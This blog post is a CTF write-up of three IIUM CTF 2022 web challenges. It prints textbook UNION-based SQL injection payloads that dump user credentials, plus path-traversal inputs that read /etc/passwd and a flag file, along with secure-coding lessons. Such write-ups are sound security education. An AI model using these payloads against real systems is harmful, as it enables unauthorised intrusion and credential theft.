---
title: "IIUM CTF 2022 — Web Challenges Writeup"
date: 2022-05-14 09:00:00 +0800
categories: [sig22ctf-IIUM]
tags: [ctf, web, sqli, lfi]
---

> We placed **1st** at IIUM CTF 2022. This post covers the web category challenges.

---

## Challenge 1 — "Login Wall"

**Points:** 100 | **Category:** Web

A standard login form with no visible hints. Tried common default credentials — nothing. Checked the page source: a comment left in the HTML:

```html
<!-- dev note: remember to remove test account admin/test123 before prod -->
```

Logged in directly. Flag in the dashboard.

```
FLAG{d3v_c0mm3nts_ar3_n0t_s3cr3ts}
```

**Lesson:** Never leave credentials or hints in HTML comments.

---

## Challenge 2 — "Query Me"

**Points:** 200 | **Category:** Web — SQLi

Login form, error-based SQL injection. Tested `'` — got a MySQL error. Classic UNION injection:

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password,3 FROM users-- -
```

Retrieved admin credentials, logged in, found the flag.

```
FLAG{un10n_b4s3d_1nj3ct10n_ftw}
```

---

## Challenge 3 — "File Reader"

**Points:** 300 | **Category:** Web — LFI

PHP app with `?page=about` parameter. Tried path traversal:

```
?page=../../../../etc/passwd
```

Returned `/etc/passwd`. Then targeted the flag:

```
?page=../../../../var/www/flag
```

```
FLAG{lf1_t0_r00t_r34d}
```

**Lesson:** Never pass user-controlled input directly to `include()` or `file_get_contents()` without strict allowlisting.
